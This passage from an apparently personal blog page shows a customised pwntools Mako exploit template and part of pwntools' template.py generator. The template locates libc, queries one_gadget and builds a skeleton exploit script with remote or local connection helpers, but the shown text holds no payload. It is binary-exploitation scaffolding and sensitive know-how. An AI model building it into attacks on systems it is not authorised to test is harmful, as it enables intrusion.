</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="n">page</span> <span class="n">args</span><span class="o">=</span><span class="s2">&#34;binary, libc = None, host=None, port=None, user=None, password=None, remote_path=None,quiet=False&#34;</span><span class="o">/&gt;</span>\
</span></span><span class="line"><span class="cl"><span class="o">&lt;%</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwnlib.context</span> <span class="kn">import</span> <span class="n">context</span> <span class="k">as</span> <span class="n">ctx</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwnlib.elf.elf</span> <span class="kn">import</span> <span class="n">ELF</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwnlib.util.sh_string</span> <span class="kn">import</span> <span class="n">sh_string</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">asm</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">elftools.common.exceptions</span> <span class="kn">import</span> <span class="n">ELFError</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">argv</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">binary</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">       <span class="n">ctx</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="n">ELFError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_static_binary</span><span class="p">(</span><span class="n">binary_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;file&#39;</span><span class="p">,</span> <span class="n">binary_path</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;statically linked&#39;</span> <span class="ow">in</span> <span class="n">output</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_shared_libraries</span><span class="p">(</span><span class="n">binary_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;ldd&#39;</span><span class="p">,</span> <span class="n">binary_path</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">libs</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">output</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;libc.so.6&#39;</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">lib_path</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;=&gt;&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="c1">#libs.append(lib_path)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">lib_path</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#return libs</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_one_gadget</span><span class="p">(</span><span class="n">libc_path</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;one_gadget&#39;</span><span class="p">,</span> <span class="n">libc_path</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">output</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">nonzero</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">arg</span> <span class="ow">in</span> <span class="n">args</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">binary</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">ret</span> <span class="o">=</span> <span class="n">is_static_binary</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">ret</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flags</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="n">libc_path</span> <span class="o">=</span> <span class="n">get_shared_libraries</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">og</span> <span class="o">=</span> <span class="n">find_one_gadget</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">binary</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;./path/to/binary&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ssh</span> <span class="o">=</span> <span class="n">user</span> <span class="ow">or</span> <span class="n">password</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">ssh</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">port</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">port</span> <span class="o">=</span> <span class="mi">22</span>
</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="n">host</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">port</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">port</span> <span class="o">=</span> <span class="mi">4141</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">remote_path</span> <span class="o">=</span> <span class="n">remote_path</span> <span class="ow">or</span> <span class="n">exe</span>
</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="n">password</span> <span class="ow">or</span> <span class="s1">&#39;secret1234&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">binary_repr</span> <span class="o">=</span> <span class="nb">repr</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_repr</span> <span class="o">=</span> <span class="nb">repr</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>\
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1">#context.log_level = &#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#context.log_level = &#34;debug&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#attach(p)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="o">%</span><span class="k">if</span> <span class="n">ctx</span><span class="o">.</span><span class="n">binary</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">binary</span> <span class="o">=</span> <span class="err">$</span><span class="p">{</span><span class="n">binary_repr</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="n">binary_repr</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span>
</span></span><span class="line"><span class="cl">    <span class="o">%</span><span class="k">if</span> <span class="ow">not</span> <span class="n">libc</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
</span></span><span class="line"><span class="cl">    <span class="o">%</span><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="err">$</span><span class="p">{</span><span class="n">libc_repr</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="o">%</span><span class="n">endif</span>
</span></span><span class="line"><span class="cl">    <span class="o">%</span><span class="n">endif</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">l64</span> <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">l32</span> <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xf7</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">),</span><span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">sa</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span>  <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">),</span><span class="nb">str</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">lg</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="n">name</span> <span class="o">+</span> <span class="s2">&#34;: 0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">se</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">payload</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">rl</span>  <span class="o">=</span> <span class="k">lambda</span>      <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">sl</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">payload</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ru</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span>     <span class="p">:</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">exp</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="k">if</span> <span class="n">binary</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="k">if</span> <span class="n">flags</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">$</span><span class="si">{og}</span><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="n">endif</span>
</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="n">endif</span>
</span></span><span class="line"><span class="cl">    
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="templatepy">template.py</h4>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230623114824366.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230623114824366.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230623114824366.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230623114824366.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230623114824366.png"
        title="image-20230623114824366" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">absolute_import</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">division</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwnlib.commandline</span> <span class="kn">import</span> <span class="n">common</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">mako.lookup</span> <span class="kn">import</span> <span class="n">TemplateLookup</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">common</span><span class="o">.</span><span class="n">parser_commands</span><span class="o">.</span><span class="n">add_parser</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;template&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">help</span> <span class="o">=</span> <span class="s1">&#39;Generate an exploit template&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">description</span> <span class="o">=</span> <span class="s1">&#39;Generate an exploit template&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;exe&#39;</span><span class="p">,</span> <span class="n">nargs</span><span class="o">=</span><span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Target binary&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--libc&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Remote libc version&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--host&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Remote host / SSH server&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--port&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Remote port / SSH port&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--user&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;SSH Username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--pass&#39;</span><span class="p">,</span> <span class="s1">&#39;--password&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;SSH Password&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--path&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Remote path of file on SSH server&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--quiet&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Less verbose template comments&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--color&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Print the output in color&#39;</span><span class="p">,</span> <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;never&#39;</span><span class="p">,</span> <span class="s1">&#39;always&#39;</span><span class="p">,</span> <span class="s1">&#39;auto&#39;</span><span class="p">],</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;auto&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">lookup</span> <span class="o">=</span> <span class="n">TemplateLookup</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">directories</span>      <span class="o">=</span> <span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">pwnlib</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;templates&#39;</span><span class="p">)],</span>
</span></span><span class="line"><span class="cl">        <span class="n">module_directory</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># For the SSH scenario, check that the binary is at the</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># same path on the remote host.</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">user</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">path</span> <span class="ow">or</span> <span class="n">args</span><span class="o">.</span><span class="n">exe</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">&#34;Must specify --path or a exe&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">user</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">port</span> <span class="ow">or</span> <span class="mi">22</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">password</span> <span class="ow">or</span> <span class="kc">None</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">remote_file</span> <span class="o">=</span> <span class="n">args</span><span class="o">.</span><span class="n">path</span> <span class="ow">or</span> <span class="n">args</span><span class="o">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span><span class="o">.</span><span class="n">download</span><span class="p">(</span><span class="n">remote_file</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
